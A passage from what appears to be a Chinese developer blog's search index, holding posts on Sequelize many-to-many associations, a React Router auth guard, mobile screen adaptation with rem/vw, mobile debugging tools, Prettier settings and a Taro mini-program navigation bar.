(!Array.isArray(item.children)) item.children = []; item.children = [data, ...item.children]; &#125; // 递归 if (Array.isArray(item.children)) &#123; item.children = findByIdAndAddChildren(item.children, id, data, level + 1); &#125; &#125; return list; &#125; // 要排序一下哦 return list .sort((a, b) =&gt; a.level - b.level) .reduce((arr, item) =&gt; findByIdAndAddChildren(arr, item.pid, item), []);&#125; 参考资料 https://sequelize.org/master/manual/assocs.html","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/categories/Mysql/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/tags/Mysql/"}]},{"title":"关于 Sequelize 关联 N：M 的问题","slug":"Mysql/关于 Sequelize 关联 N：M 的问题","date":"2020-07-25T13:42:14.000Z","updated":"2021-06-15T06:10:52.830Z","comments":true,"path":"/stories/2020/07/Mysql/关于 Sequelize 关联 N：M 的问题/","link":"","permalink":"http://me.lizhooh.com/stories/2020/07/Mysql/关于 Sequelize 关联 N：M 的问题/","excerpt":"前言关于 Sequelize 关联 N：M 的问题，以一个业务示例来讲解。 业务需求模型：用户，角色，部门 在创建用户时可以选择多个角色，可以选择一个部门。 在创建角色时可以选择多个部门，需要记录创建者用户。 在创建部门时，需要记录创建者用户。","text":"前言关于 Sequelize 关联 N：M 的问题，以一个业务示例来讲解。 业务需求模型：用户，角色，部门 在创建用户时可以选择多个角色，可以选择一个部门。 在创建角色时可以选择多个部门，需要记录创建者用户。 在创建部门时，需要记录创建者用户。 ps: 部门是用于控制权限的。 那么总结来说： 一个用户对应着多个角色，对应者一个部门。 一个角色关联着多个使用者，对应一个创建者。 一个部门关联着多个使用者，对应一个创建者。 这是典型的 N：M 超级多对多关系。 代码实现下面来看看如何用 Sequelize 实现逻辑代码。 创建模型首先创建模型： 1234567891011121314151617// 用户const User = sequelize.define('user', &#123; name: DataTypes.STRING,&#125;, config);// 角色const Role = sequelize.define('role', &#123; title: DataTypes.STRING,&#125;, config);// 部门const Agency = sequelize.define('agency', &#123; title: DataTypes.STRING,&#125;, config);// 用户与角色多对多，之间的中间层const UserRole = sequelize.define('userRole', &#123;&#125;, config); 设置关联关系关联用户与角色之间的关系（多对多）： 123// 一个角色对应着有多个使用者User.belongsToMany(Role, &#123; through: UserRole &#125;);Role.belongsToMany(User, &#123; through: UserRole &#125;); 关联角色与创建者的关系（一对一）： 12// 一个角色对应着一个创建者const RoleCreator = Role.belongsTo(User, &#123; as: 'creator' &#125;); 关联角色与部门之间的关系（一对多）： 12//（一对多）一个角色对应着多个部门Role.hasMany(Agency); 关联部门与创建者的关系（一对一）： 12// 一个部门对应着一个创建者const AgencyCreator = Agency.belongsTo(User, &#123; as: 'creator' &#125;); 一个新用户需要选择一个部门： 12// （一对一）一个用户对应着一个机构，一个机构被多个用户对应（无操作）User.hasOne(Agency); 逻辑代码实现12// 去掉不必要的字段const through = &#123; attributes: [] &#125;; 部门创建部门： 12const agency1 = await Agency.create(&#123; title: '事业部' &#125;);const agency2 = await Agency.create(&#123; title: '产品部' &#125;); 这样就创建的部门了，接下来添加部门的创建者： 12345const user1 = await User.create(&#123; name: '小品' &#125;);const user2 = await User.create(&#123; name: '小盘' &#125;);// 部门的创建者await agency1.setCreator(user1);await agency2.setCreator(user2); 单个部门的查询： 123456// 单个部门const agency = await Agency.findOne(&#123; where: &#123; id: 1 &#125;, include: [AgencyCreator], through: through,&#125;); 返回的结果数据： 1234567891011&#123; \"id\": 1, \"title\": \"事业部\", \"roleId\": 2, \"userId\": 5, \"creatorId\": 1, \"creator\": &#123; \"id\": 1, \"name\": \"小品\" &#125;&#125; 部门列表查询： 12345const agencyList = await Agency.findOne(&#123; offset: 0, limit: 10, include: [AgencyCreator], through: through,&#125;); 返回的结果数据： 123456789101112131415161718192021[&#123; \"id\": 1, \"title\": \"事业部\", \"roleId\": 2, \"userId\": 5, \"creatorId\": 1, \"creator\": &#123; \"id\": 1, \"name\": \"小品\" &#125;&#125;, &#123; \"id\": 2, \"title\": \"产品部\", \"roleId\": 1, \"userId\": 6, \"creatorId\": 2, \"creator\": &#123; \"id\": 2, \"name\": \"小盘\" &#125;&#125;] 更新/删除部门，更新部门一般不会更新创建者，删除时需要检查是否有引用关系。 1// 删除时，检查 userId 和 roleId 是否为空 角色创建角色： 12const role1 = await Role.create(&#123; title: '研发权限' &#125;);const role2 = await Role.create(&#123; title: '产品权限' &#125;); 接下来添加角色的创建者： 123456const user1 = await User.create(&#123; name: '小赵' &#125;);const user2 = await User.create(&#123; name: '小瓶' &#125;);// 关键的一步（记录角色的创建者）await role1.setCreator(user1);await role2.setCreator(user2); 接下来添加部门： 123// 创建角色时，需要选择多个部门await role1.addAgency([agency1, agency2]);await role2.addAgency([agency1]); 角色列表查询： 12345678910111213// 主要显示时要求把机构，创建者，关联的用户带出来const role = await Role.findAll(&#123; offset: 0, limit: 10, include: [&#123; model: User, include: [&#123; model: Role, through: through, include: [RoleCreator] &#125;, Agency], through: through, &#125;, Agency, RoleCreator],&#125;); 返回的结果数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182[&#123; \"id\": 2, \"title\": \"产品权限\", \"creatorId\": 4, \"users\": [ &#123; \"id\": 5, \"name\": \"小明\", \"roles\": [ &#123; \"id\": 1, \"title\": \"研发权限\", \"creatorId\": 3, \"creator\": &#123; \"id\": 3, \"name\": \"小赵\" &#125; &#125;, &#123; \"id\": 2, \"title\": \"产品权限\", \"creatorId\": 4, \"creator\": &#123; \"id\": 4, \"name\": \"小瓶\" &#125; &#125; ], \"agency\": &#123; \"id\": 1, \"title\": \"事业部\", \"roleId\": 2, \"userId\": 5, \"creatorId\": 1 &#125; &#125;, &#123; \"id\": 6, \"name\": \"小花\", \"roles\": [ &#123; \"id\": 1, \"title\": \"研发权限\", \"creatorId\": 3, \"creator\": &#123; \"id\": 3, \"name\": \"小赵\" &#125; &#125;, &#123; \"id\": 2, \"title\": \"产品权限\", \"creatorId\": 4, \"creator\": &#123; \"id\": 4, \"name\": \"小瓶\" &#125; &#125; ], \"agency\": &#123; \"id\": 2, \"title\": \"产品部\", \"roleId\": 1, \"userId\": 6, \"creatorId\": 2 &#125; &#125; ], \"agencys\": [ &#123; \"id\": 1, \"title\": \"事业部\", \"roleId\": 2, \"userId\": 5, \"creatorId\": 1 &#125; ], \"creator\": &#123; \"id\": 4, \"name\": \"小瓶\" &#125;&#125;] 更新/删除角色，更新角色一般不会更新创建者，删除时需要检查是否有引用关系。 1// 删除时，检查 agencys 数组和 users 数组是否为空 用户创建用户： 12const user1 = await User.create(&#123; name: '小明' &#125;);const user2 = await User.create(&#123; name: '小花' &#125;); 创建用户时可以选择多个角色： 123// 用户创建时，可以选择关联多个角色await user1.addRole([role1, role2]);await user2.addRole([role1, role2]); 创建用户时可以选择单个机构： 123// 用户创建时，可以选择单个机构await user1.setAgency(agency1);await user2.setAgency(agency2); 用户列表查询： 1234567const userList = await User.findAll(&#123; offset: 0, limit: 10, include: [&#123; model: Role, through: through, &#125;, Agency],&#125;); 查询结果： 1234567891011121314151617181920212223[&#123; \"id\": 5, \"name\": \"小明\", \"roles\": [ &#123; \"id\": 1, \"title\": \"研发权限\", \"creatorId\": 3 &#125;, &#123; \"id\": 2, \"title\": \"产品权限\", \"creatorId\": 4 &#125; ], \"agency\": &#123; \"id\": 1, \"title\": \"事业部\", \"roleId\": 2, \"userId\": 5, \"creatorId\": 1 &#125;&#125;] 小结Sequelize 提供关联查询还是挺方便的，但是发现如果很复杂时，Sequelize 帮不了你，你可能需要写原生的 SQL 语句查询。像这种多对多的关联查询，一般需要一个中间表，之后就是无限的 LEFT OUTER JOIN 了。 秀出部分 SQL 原生查询语句： 123456789101112SELECT roles.id as id, roles.title as title, agencies.id as agencyId, agencies.title as agencyTitle, users.id as userId, users.name as userNameFROM rolesLEFT JOIN roleRelateUser ON roleRelateUserId.id = roles.roleRelateUserIdLEFT JOIN users ON roleRelateUser.userId = users.idLEFT JOIN roleRelateAgency ON roleRelateAgency.id = roles.roleRelateAgencyIdLEFT JOIN agency ON roleRelateAgency.agencyId = agency.id 参考资料 http://semlinker.com/node-sequelize-1vm/ https://sequelize.org/master/manual/creating-with-associations.html https://demopark.github.io/sequelize-docs-Zh-CN/core-concepts/assocs.html","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/categories/Mysql/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/tags/Mysql/"}]},{"title":"React Router 4 关于前端守卫","slug":"React/Router/React Router 4 关于前端守卫","date":"2020-07-07T11:12:58.000Z","updated":"2021-06-15T06:10:52.882Z","comments":true,"path":"/stories/2020/07/React/Router/React Router 4 关于前端守卫/","link":"","permalink":"http://me.lizhooh.com/stories/2020/07/React/Router/React Router 4 关于前端守卫/","excerpt":"前言由于 React Router 4 没有事件系统，因此在前端路由守卫这里比 Vue-Router 做起来麻烦多了，因为监听不到路由的变化。 那么怎么做呢？React Router 的作者说了，难的都由你们自己实现，哈哈。","text":"前言由于 React Router 4 没有事件系统，因此在前端路由守卫这里比 Vue-Router 做起来麻烦多了，因为监听不到路由的变化。 那么怎么做呢？React Router 的作者说了，难的都由你们自己实现，哈哈。 官方做法官方有一个示例： 1234567891011121314151617181920212223242526const fakeAuth = &#123; isAuthenticated: false, authenticate(cb) &#123; fakeAuth.isAuthenticated = true; setTimeout(cb, 100); // fake async &#125;, signout(cb) &#123; fakeAuth.isAuthenticated = false; setTimeout(cb, 100); &#125;,&#125;;function AuthButton() &#123; const history = useHistory(); return fakeAuth.isAuthenticated ? &lt;p&gt; Welcome! &lt;button onClick=&#123;() =&gt; fakeAuth.signout(() =&gt; history.push('/'))&#125;&gt; Sign out &lt;/button&gt; &lt;/p&gt; : &lt;p&gt;You are not logged in.&lt;/p&gt; ;&#125; 大致的意思是：你用一个变量存起 token 来，自己写一个 Button 实现在点击时进行检查 token。 这样的确可以实现，但是只能实现单个页面的权限控制，如果用户直接从 url 进入呢？会出 BUG 的。 应该怎么做？ 方法一：写一个装饰器，挂在 class component 上 方法二：或者写一个 HOC 修饰一个 component。 方法三：编写一个 useAuth 钩子函数，在每一个 page 组件里调用一下这个 hook。 方法四：基于上面的，再做一步验证。 方法一，方法二这里就不讲了（主要是现在不写 class 组件），说说方法三和方法四。 方法三，编写一个 useAuth： 123456789101112131415161718192021222324252627282930313233343536/** * 检查 token 默认：不通过会转跳到登页 * @param success * @param fail */export default function useAuth(success?: Function, fail?: Function) &#123; const history = useHistory(); const [isLoading, setLoading] = useState(true); useEffect(() =&gt; &#123; const token = storage.get('token'); // 先检查 token if (token) &#123; api.checkToken().then(res =&gt; &#123; if (res) &#123; success &amp;&amp; success(); setLoading(false); &#125; else &#123; history.replace(LOGIN_URL); fail &amp;&amp; fail(); &#125; &#125;).catch(err =&gt; &#123; history.replace(LOGIN_URL); fail &amp;&amp; fail(); &#125;); &#125; else &#123; history.replace(LOGIN_URL); fail &amp;&amp; fail(); &#125; &#125;, []); return isLoading;&#125; 方法四，基于上面的，再做一步验证。 由于上面是点击按钮时做验证的，那么如果用户直接输入 url 进入就会检验不到。这样的话在主的路由页面里做一次验证。 例如编写一个 Admin 页面。 12345678910111213141516171819202122const Admin = () =&gt; &#123; // 在这里做一下验证 const isLoading = useAuth(); if (isLoading) return ( &lt;Loading /&gt; ); return ( &lt;div&gt; &lt;nav&gt; &lt;AuthButton&gt;...&lt;/AuthButton&gt; &lt;/nav&gt; &lt;Switch&gt; &lt;Route path='home' component=&#123;Home&#125; /&gt; &lt;Route path='home1' component=&#123;Home1&#125; /&gt; &lt;Route path='home2' component=&#123;Home2&#125; /&gt; &lt;Route path='home3' component=&#123;Home3&#125; /&gt; &lt;/Switch&gt; &lt;/div&gt; );&#125; 参考资料 https://reactrouter.com/web/example/auth-workflow","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"React-Router","slug":"React-Router","permalink":"http://me.lizhooh.com/tags/React-Router/"}]},{"title":"移动端适配的方案","slug":"移动端/移动端适配的方案","date":"2020-06-19T07:46:23.000Z","updated":"2021-06-15T06:10:52.922Z","comments":true,"path":"/stories/2020/06/移动端/移动端适配的方案/","link":"","permalink":"http://me.lizhooh.com/stories/2020/06/移动端/移动端适配的方案/","excerpt":"前言由于移动端不同的设备屏幕大小，不同的分辨率，导致 15px 在不同手机上显示不用的效果，有的手机看起来比较小，有的手机看起来比较大，因此就产生了前端移动端适配的问题。 目前来看，移动端适配问题，主要以 viewport + rem + flexbox + media + vw/vh + 百分比 实现。 说明： viewport：设置不可缩放，缩放为 1。 rem：全部字体大小，边距等使用 rem，默认是 1rem = 16px，rem 会继承 html 的 font-size。 flexbox：弹性布局，适合移动端这种小屏幕。 media：媒体查询，可以针对不同设备宽度进行调整 rem 的值。 vw/vh：现在的手机基本都兼容了，也是主流的方式。 百分比：用百分比控制布局，例如 width: 33.333%，实现一行三列。","text":"前言由于移动端不同的设备屏幕大小，不同的分辨率，导致 15px 在不同手机上显示不用的效果，有的手机看起来比较小，有的手机看起来比较大，因此就产生了前端移动端适配的问题。 目前来看，移动端适配问题，主要以 viewport + rem + flexbox + media + vw/vh + 百分比 实现。 说明： viewport：设置不可缩放，缩放为 1。 rem：全部字体大小，边距等使用 rem，默认是 1rem = 16px，rem 会继承 html 的 font-size。 flexbox：弹性布局，适合移动端这种小屏幕。 media：媒体查询，可以针对不同设备宽度进行调整 rem 的值。 vw/vh：现在的手机基本都兼容了，也是主流的方式。 百分比：用百分比控制布局，例如 width: 33.333%，实现一行三列。 下面来看看几大厂的做法。 淘宝移动端淘宝的移动端适配做的比较好，通过自家的 flexible 库，用 js 实现不同宽度下的根 font-size。 flexible 有个计算方式是：1rem = 100px，编写时遵循这个规则即可。 不断切换手机可以发现： 123456789101112131415161718192021222324/* galaxy s5 */html &#123; font-size: 96px;&#125;/* iphone 5/SE */html &#123; font-size: 85.3333px;&#125;/* iphone 6/7/8 */html &#123; font-size: 100px;&#125;/* iphone 6/7/8 plus */html &#123; font-size: 110.4px;&#125;/* ipad */html &#123; font-size: 204.8px;&#125; 这里有部分的代码： 1234567891011121314151617181920(function (doc, win) &#123; var docEl = doc.documentElement, resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize', recalc = function () &#123; var clientWidth = docEl.clientWidth; if (!clientWidth) return; //如果页面的宽度超过了640px，那么页面中html的font-size恒为100px， //否则页面中html的font-size的大小为：100*(当前页面宽度/640) if (clientWidth &gt;= 640) &#123; docEl.style.fontSize = '100px'; &#125; else &#123; //此时1rem=100px docEl.style.fontSize = 100 * (clientWidth / 640) + 'px'; &#125; &#125;; if (!doc.addEventListener) return; win.addEventListener(resizeEvt, recalc, false); doc.addEventListener('DOMContentLoaded', recalc, false);&#125;)(document, window); 京东移动端打开京东移动端的页面，挖代码来看看发现实现适配方式与淘宝的有所不同，京东的实现方式主要是使用 rem + media。 审查某个字体的样式，可以看到，全部的使用 rem。 12345.graphic-wz &#123; font-size: 0.6rem; line-height: 0.825rem; height: 0.75rem;&#125; 再切换几个手机试试： 123456789101112131415161718192021/* ipad */@media screen and (min-width: 540px) &#123; html &#123; font-size: 28.8px; &#125;&#125;/* iphone 6/7/8 plus */html &#123; font-size: 20px; font-size: 5.33333vw;&#125;/* iphone 5/SE */@media screen and (max-width: 320px) &#123; html &#123; font-size: 17.06667px; &#125;&#125;/* 其他情况大部分都是 5.33333vw */ vw 估计他们手动算好不同的屏幕大小下的值，重复写两个 font-size 是为了不兼容 vw 时使用默认的大小。 与淘宝相比其实整体思路是不变的，因为淘宝是通过 js 来动态改变 font-size，对兼容性比较好，而京东的是通过 vw 来设置 font-size。而 vw 是一个自适应的属性，它会自动根据屏幕的变化来尝试变化，例如屏幕是 960px，那么 5.33333vw 应该是 0.05.33333% * 960px。 网易新闻网易新闻实现方式和京东类似，下面是从网易新闻 css 挖出来的代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263html &#123; font-size: 13.33333vw;&#125;@media screen and (max-width: 320px) &#123; html &#123; font-size: 42.667px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 321px) and (max-width:360px) &#123; html &#123; font-size: 48px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 361px) and (max-width:375px) &#123; html &#123; font-size: 50px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 376px) and (max-width:393px) &#123; html &#123; font-size: 52.4px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 394px) and (max-width:412px) &#123; html &#123; font-size: 54.93px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 413px) and (max-width:414px) &#123; html &#123; font-size: 55.2px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 415px) and (max-width:480px) &#123; html &#123; font-size: 64px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 481px) and (max-width:540px) &#123; html &#123; font-size: 72px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 541px) and (max-width:640px) &#123; html &#123; font-size: 85.33px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 641px) and (max-width:720px) &#123; html &#123; font-size: 96px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 721px) and (max-width:768px) &#123; html &#123; font-size: 102.4px; font-size: 13.33333vw; &#125;&#125;@media screen and (min-width: 769px) &#123; html &#123; font-size: 102.4px; font-size: 13.33333vw; &#125;&#125; 京东的是 5.33333vw，网页新闻的是 13.33333vw，差这么多，最后的显示效果为什么一样呢？因为实际的 rem 写法不同，例如京东的文字是 font-size: 0.6rem;，网易新闻的是 font-size: 0.34rem;，哈哈。 常用插件 导航滚动：iscroll，主要是解决一下下拉刷新，iOS 滚动条惯性的问题。 图片轮播：swiperjs，基本移动端各大厂都在用，非常好用，性能也不错。 手机分辨率适配：flexible，淘宝自己在用，挺不错。 解决点击延迟：fastclick，可以解决 iOS 点击延迟的问题。 annimate.css：annimate.css，用 css3 替代实现的动画库。 总结移动端适配方案有多种，可以通过动态 js 计算改变 rem 的值，也可以通过 vw 来改变 rem 的值，总的来说，最简单的方案就是 rem + vw + media 了。 补上 viewport 的： 1&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\"&gt; 参考资料 https://zhuanlan.zhihu.com/p/101432990 https://www.cnblogs.com/2050/p/3877280.html","categories":[{"name":"移动端","slug":"移动端","permalink":"http://me.lizhooh.com/categories/移动端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"移动端","slug":"移动端","permalink":"http://me.lizhooh.com/tags/移动端/"}]},{"title":"移动端调试几大方式","slug":"移动端/移动端调试几大方式","date":"2020-06-18T11:26:53.000Z","updated":"2021-06-15T06:10:52.922Z","comments":true,"path":"/stories/2020/06/移动端/移动端调试几大方式/","link":"","permalink":"http://me.lizhooh.com/stories/2020/06/移动端/移动端调试几大方式/","excerpt":"前言移动端调试是一个比较难的点，手机系统涉及 Android 和 iOS 两大阵型。iOS 的麻烦点在于 iOS 本身的浏览器有很多兼容性坑，而 Android 的麻烦的在于 Android 手机有很多不同的版本以及浏览器，例如 UC，QQ，百度，360，微信浏览器等，特别是微信浏览器堪称移动端的 IE。 痛点移动端调试痛点在于： 开发时，在自己电脑上运行得好好的，在手机上打开就挂了，但是手机上又看不到 error log。 上线后，某用户表示页面失灵，但我们自己又重现不出来，看不到用户侧的出错信息。 某些界面在 PC 端上，在华为上显示正常，到了另一台手机，布局都花了。","text":"前言移动端调试是一个比较难的点，手机系统涉及 Android 和 iOS 两大阵型。iOS 的麻烦点在于 iOS 本身的浏览器有很多兼容性坑，而 Android 的麻烦的在于 Android 手机有很多不同的版本以及浏览器，例如 UC，QQ，百度，360，微信浏览器等，特别是微信浏览器堪称移动端的 IE。 痛点移动端调试痛点在于： 开发时，在自己电脑上运行得好好的，在手机上打开就挂了，但是手机上又看不到 error log。 上线后，某用户表示页面失灵，但我们自己又重现不出来，看不到用户侧的出错信息。 某些界面在 PC 端上，在华为上显示正常，到了另一台手机，布局都花了。 PC 上在 Chorme 上在 PC Chorme 上，按 ctrl + shift + m 即可以进入移动端调试页面，这个大家都懂的。 使用模拟器 + Charles使用 Android 模拟器（例如雷电模拟器），iOS 模拟器，外加 Charles 来调试。 微信 web 开发者工具微信 web 开发者工具很好的为我们提供了内置类似 weinre 的调试工具。使用起来也非常简单，直接打开工具即可。 真机上VconsoleVconsole 是腾讯出的一个移动端调试神器，界面设计良好，可以很方便的调试查看网络请求，js 输出，DOM 元素等。 使用方式也非常简单： 1234&lt;!-- 注意要在头部引入 --&gt;&lt;head&gt; &lt;script src='path/to/vconsole.min.js'&gt;&lt;/script&gt;&lt;/head&gt; 1234567// 需要实例化才显示const vconsole = new vConsole();// 有一些方法可以使用vconsole.ready(() =&gt; &#123; console.log('Hello World');&#125;); 在线 demo：微信扫描以下二维码（或微信内长按图片识别二维码），即可体验 vConsole 面板。 ErudaEruda 与 Vconsole 类似，这里就不具体介绍了，直接放出 github：https://github.com/liriliri/eruda CharlesCharles 是一个抓包软件，可以在真机上进行抓包来调试网络层。 Chrome + Android USB 调试（强烈推荐）分为几个步骤： 第一步：打开 Android 手机 设置 &gt; 开发者选项 &gt; USB 调试。 第二步：通过数据线连接你的电脑和 Android 手机，记得授权。 第三步：给你的 Android 手机下载一个手机版的 Chrome 浏览器，并在手机上的 Chrome 浏览器 中打开你需要调试的页面。 第四步：打开你电脑上的 Chrome，按下图标注顺序，先 F12 打开调试面板，然后找到 remote devices（在右上角 ... 图标 More Tools 里）。 第五步：remote devices 里会显示在手机 chrome 打开的页面，每个页面右侧都有一个 Inspect 检查的按钮，点击就会出现你熟悉的调试页面了。 具体原理，我猜是手机端的 Chrome 通过协议连接，把界面的数据传输到 PC 端的 Chorme 从而实现点对点的调试。 Mac + Safari + IOS USB 调试（强烈推荐）分为几个步骤： 第一步：打开苹果手机 设置 &gt; Safari 浏览器 &gt; 高级 &gt; Web 检查器。 第二步：打开 Mac 上的 Safari 浏览器 &gt; 偏好设置 &gt; 高级 &gt; 在菜单栏中显示“开发”菜单。 第三步：用数据线连接你的 Mac 电脑和苹果手机，并选择信任设备。然后在手机的 Safari 浏览器 中打开你需要调试的页面。 第四步：点击之后，就会出现熟悉的调试界面。 参考资料 https://github.com/liriliri/eruda https://github.com/Tencent/vConsole","categories":[{"name":"移动端","slug":"移动端","permalink":"http://me.lizhooh.com/categories/移动端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"移动端","slug":"移动端","permalink":"http://me.lizhooh.com/tags/移动端/"}]},{"title":"Prettier 文档","slug":"前端/Prettier 格式化配置","date":"2020-06-06T10:23:48.000Z","updated":"2021-06-15T06:10:52.903Z","comments":true,"path":"/stories/2020/06/前端/Prettier 格式化配置/","link":"","permalink":"http://me.lizhooh.com/stories/2020/06/前端/Prettier 格式化配置/","excerpt":"前言Prettier 的中文意思是“漂亮的、机灵的”，也是一个流行的代码格式化工具的名称，它能够解析代码，使用你自己设定的规则来重新打印出格式规范的代码。 Prettier 具有以下几个有优点： 可配置化 支持多种语言 集成多数的编辑器 简洁的配置项","text":"前言Prettier 的中文意思是“漂亮的、机灵的”，也是一个流行的代码格式化工具的名称，它能够解析代码，使用你自己设定的规则来重新打印出格式规范的代码。 Prettier 具有以下几个有优点： 可配置化 支持多种语言 集成多数的编辑器 简洁的配置项 使用在 vscode 上使用非常简单，先安装 prettier 的插件即可，默认开启格式化功能。 配置看了一下文档，Prettier 的配置很少，基本涉及的主要几个方面，还不能做到很细粒度的配置，不像 ESLint 这么多。 Prettier 使用 cosmiconfig 来支持配置文件。这意味着您可以通过（按优先顺序）配置更漂亮： package.json 中的 prettier 字段。 .prettierrc 用 JSON 或 YAML 编写的文件，带有可选扩展名：（.json/.yaml/.yml 无扩展名优先）。 一个 .prettierrc.js 或 prettier.config.js 文件导出的对象。 .prettierrc.toml 用 TOML 编写的文件（需要.toml扩展名）。 将从要格式化的文件的位置开始解析配置文件，然后向上搜索文件树，直到找到（或找不到）配置文件。 示例： 123456&#123; \"trailingComma\": \"es5\", \"tabWidth\": 4, \"semi\": false, \"singleQuote\": true&#125; 123456module.exports = &#123; trailingComma: \"es5\", tabWidth: 4, semi: false, singleQuote: true,&#125;; 1234trailingComma: \"es5\"tabWidth: 4semi: falsesingleQuote: true 配置项printWidth换行的长度，默认 80。 tabWidth缩进字节数，默认 4。 useTabs缩进是否使用 tab，默认 false。 semi句尾添加分号，默认 true。 singleQuote使用单引号代替双引号，默认 false。 proseWrap解析器，不用管。 arrowParens箭头函数参数只有一个时是否要有小括号，默认 always（总是要）。 bracketSpacing在对象，数组括号与文字之间加空格，默认 true。 disableLanguages不格式化的语言列表，默认空，建议设置 [&quot;vue&quot;]，不要管 vue，哈哈。 endOfLine结尾符，默认是 auto。 eslintIntegrationprettier 是否使用 eslint 的代码格式进行校验，默认 false。 ignorePath忽略文件的路径，默认 .prettierignore。 jsxBracketSameLine在 jsx 中把 ‘&gt;’ 是否单独放一行，默认 false。 jsxSingleQuote在 jsx 中使用单引号代替双引号，默认 false。 parser格式化的解析器，默认 babylon。 stylelintIntegrationprettier 是否使用 stylelint 的代码格式进行校验，默认 false。 trailingComma在对象或数组最后一个元素后面是否加逗号，默认加。 tslintIntegrationprettier 是否使用 tslint 的代码格式进行校验，默认 false。 在 vsocde 上配置配置每个语言的规则： 1234567891011121314&#123; \"[html]\": &#123; \"editor.defaultFormatter\": \"esbenp.prettier-vscode\" &#125;, \"[css]\": &#123; \"editor.defaultFormatter\": \"esbenp.prettier-vscode\" &#125;, \"[less]\": &#123; \"editor.defaultFormatter\": \"esbenp.prettier-vscode\" &#125;, \"[javascript]\": &#123; \"editor.defaultFormatter\": \"esbenp.prettier-vscode\" &#125;&#125; vscode 上配置需要加 prettier 前缀，例如： 12345// 超过最大值换行\"prettier.printWidth\": 100,// 缩进字节数\"prettier.tabWidth\": 4, 参考资料 https://prettier.io/","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"小程序自定义导航栏（NavTopBar）","slug":"小程序/小程序自定义导航栏（NavTopBar）","date":"2020-05-30T07:04:44.000Z","updated":"2021-06-15T06:10:52.914Z","comments":true,"path":"/stories/2020/05/小程序/小程序自定义导航栏（NavTopBar）/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/小程序/小程序自定义导航栏（NavTopBar）/","excerpt":"前言UI 遇到这么一个需求，要求导航栏自定义，实现像如下图的情况，要求背景颜色渐变，可以选择定位内容。这样一来得弄自定义导航栏，下面来看看怎么自定义。","text":"前言UI 遇到这么一个需求，要求导航栏自定义，实现像如下图的情况，要求背景颜色渐变，可以选择定位内容。这样一来得弄自定义导航栏，下面来看看怎么自定义。 自定义导航栏注意问题： 无论是小程序，还是使用 React Native，还是原生 App 都面临一个手机状态栏高度的问题，statusBarHeight 用来获取手机状态栏的高度，这个需要在全局 app.js 中的 onLaunch，调用 wx.getSystemInfo 获取，navigationBarHeight + 默认的高度，这个是设定整个导航栏的高度。 因为自定义导航栏每个页面都要写，所以把导航栏封装了公共组件，这样只需要在每个页面引入即可。 还有注意的，在写样式距离和大小时建议都用px，因小程序右边的胶囊也是用的 px，不是 rpx。 由于需要异步的获取手机状态栏高度，因此会有一些闪屏问题，采用初始化值缓存方式可以实现后面避免重复获取。 原生小程序语法实现原生小程序语法实现，先在页面或全局的 app.json 里配置导航栏 style 为 custom。 之后实现一个导航栏组件，在每个页面里进行复用即可。 使用 Taro 实现使用 Taro 实现就是，先设置页面的导航栏： 1234Home.config = &#123; navigationBarTitleText: '哈哈哈', navigationStyle: 'custom',&#125;; 再写一个导航栏组件。 1234567891011121314151617181920212223import Taro from '@tarojs/taro';import &#123; View, Text &#125; from '@tarojs/components';import '@/styles/compoents/nav-top-bar.scss';let statusBarHeight = 20;Taro.nextTick(() =&gt; &#123; const res = Taro.getSystemInfoSync(); statusBarHeight = res.statusBarHeight;&#125;);export default function NavTopBar() &#123; const s1 = &#123; paddingTop: statusBarHeight + 'px' &#125;; const s2 = &#123; top: statusBarHeight + 'px' &#125;; return ( &lt;View className='nav-top-bar' style=&#123;s1&#125;&gt; &lt;View className='nav-top-bar-box'&gt;&lt;/View&gt; &lt;View className='nav-top-bar-main' style=&#123;s2&#125;&gt; &lt;Text&gt;Hello&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; );&#125; 123456789101112131415161718192021.nav-top-bar &#123; position: relative; $height: 50PX; &amp;-box &#123; height: $height; &#125; &amp;-main &#123; position: fixed; height: $height; width: 100%; top: 0; left: 0; right: 0; z-index: 1000; box-shadow: 0 10rpx 16rpx 